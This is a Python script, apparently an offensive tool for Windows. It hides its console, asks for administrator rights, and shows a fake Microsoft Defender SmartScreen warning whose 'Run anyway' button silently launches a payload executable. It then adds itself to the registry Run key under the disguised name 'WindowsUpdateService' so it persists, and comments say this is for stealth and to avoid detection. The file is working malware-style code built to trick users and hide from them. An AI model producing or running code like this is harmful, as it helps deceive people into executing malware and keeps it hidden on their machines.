import tkinter as tk
import subprocess
import os
import ctypes
import sys
import winreg as reg

# Hide the console window for stealth
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Check for administrator privileges and relaunch if needed
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Relaunch with admin privileges using ShellExecuteW
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()  # Exit the current non-admin instance

# Define payload and log file paths (customize these as needed)
payload_path = r'C:\Users\username\payload.exe'
log_file = r'C:\Users\username\command_log.txt'

# Function to execute the payload and close the window
def run_payload():
    try:
        with open(log_file, 'w') as log:
            # Execute payload directly without shell=True for safety
            process = subprocess.Popen([payload_path], stdout=log, stderr=log)
            process.communicate()  # Wait for the process to complete
        window.destroy()  # Close the window after execution
    except Exception as e:
        # Silent error handling to avoid alerting the user
        window.destroy()  # Close anyway to maintain flow

# Function to close the window without running the payload
def close_window():
    window.destroy()

# Hover effects for the close button
def on_close_enter(event):
    close_button.config(bg="red", fg="white")

def on_close_leave(event):
    close_button.config(bg="white", fg="black")

# Simulate the SmartScreen window
def simulate_smartscreen_window():
    global window, close_button
    window = tk.Tk()
    window.title("")

    # Center the window on the screen
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    window_width = 529
    window_height = 500
    x_position = (screen_width - window_width) // 2
    y_position = (screen_height - window_height) // 2
    window.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")

    # Remove window decorations and set background
    window.overrideredirect(True)
    window.configure(bg="#005a9e")
    window.attributes('-topmost', True)  # Force window to stay on top

    # Realistic SmartScreen text
    tk.Label(window, text="Windows protected your PC", font=("Arial", 20, "bold"), 
             bg="#005a9e", fg="white").pack(pady=20, padx=20, anchor=tk.NW)
    tk.Label(window, text="Microsoft Defender SmartScreen prevented an unrecognized app from starting.", 
             font=("Arial", 10, "bold"), bg="#005a9e", fg="white").pack(pady=0, padx=20, anchor=tk.NW)
    tk.Label(window, text="Running this app might put your PC at risk.", 
             font=("Arial", 10, "bold"), bg="#005a9e", fg="white").pack(pady=0, padx=20, anchor=tk.NW)

    # Button frame for "Run anyway" and "Don't run"
    button_frame = tk.Frame(window, bg="#005a9e")
    button_frame.pack(side=tk.BOTTOM, padx=20, pady=10, anchor=tk.SE)

    tk.Button(button_frame, text="Run anyway", font=("Arial", 11, "bold"), fg="black", bg="white", 
              relief=tk.RAISED, command=run_payload).pack(side=tk.RIGHT, padx=10)
    tk.Button(button_frame, text="Don't run", font=("Arial", 11, "bold"), fg="black", bg="white", 
              relief=tk.RAISED, command=close_window).pack(side=tk.RIGHT, padx=5)

    # Custom close button
    close_button = tk.Button(window, text="   x   ", font=("Arial", 12, "bold"), fg="black", bg="white", 
                             relief=tk.FLAT, command=close_window, borderwidth=0, highlightthickness=0)
    close_button.place(x=490, y=0)
    close_button.bind("<Enter>", on_close_enter)
    close_button.bind("<Leave>", on_close_leave)

    window.mainloop()

# Add script to registry for persistence with a stealthy name
def add_registry_entry():
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    script_path = os.path.abspath(sys.argv[0])
    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
            # Use a less suspicious name than "SmartScreen"
            reg.SetValueEx(key, 'WindowsUpdateService', 0, reg.REG_SZ, script_path)
    except Exception as e:
        pass  # Silent failure to avoid detection

# Main execution
if __name__ == "__main__":
    simulate_smartscreen_window()
    add_registry_entry()